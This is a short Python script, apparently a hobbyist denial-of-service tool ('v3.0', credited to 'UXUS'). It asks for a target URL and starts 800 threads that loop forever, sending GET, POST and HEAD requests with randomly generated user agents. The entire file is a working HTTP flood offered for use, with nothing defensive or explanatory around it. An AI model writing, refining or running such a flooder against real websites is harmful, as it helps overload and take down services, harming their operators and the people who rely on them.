from user_agent import generate_user_agent, generate_navigator
import requests
from threading import Thread
import random

#Creating 5 random UserAgents
a = generate_user_agent()
b = generate_user_agent()
c = generate_user_agent()
d = generate_user_agent()
e = generate_user_agent()


#Logo
print("╔══╗──╔═╗────╔╗─────╔╗───────╔╗")
print("╚╣╠╝──║╔╝───╔╝╚╗────║║───────║║")
print("─║║╔═╦╝╚╦╦═╗╠╗╔╬╗─╔╗║╚═╦══╦╗╔╣╚═╦══╦═╗")
print("─║║║╔╬╗╔╬╣╔╗╬╣║║║─║║║╔╗║╔╗║╚╝║╔╗║║═╣╔╝")
print("╔╣╠╣║║║║║║║║║║╚╣╚═╝║║╚╝║╚╝║║║║╚╝║║═╣║")
print("╚══╩╝╚╩╝╚╩╝╚╩╩═╩═╗╔╝╚══╩══╩╩╩╩══╩══╩╝")
print("───────────────╔═╝║")
print("───────────────╚══╝              v3.0")
print("[+] Created by UXUS")

#UserAgent
users = [a, b, c, d, e]
headers = {
	'User-Agent' : random.choice(users)
}

#Useful code
url = input("[+] Url: ")
def send():
	while True:
		requests.get(url, headers=headers)
		print("$Get")
		requests.post(url, headers=headers)
		print("$Post")
		requests.head(url, headers=headers)
		print("$Head")

if __name__ == '__main__':
	for i in range (800):
		thr = Thread(target=send)
		thr.start()
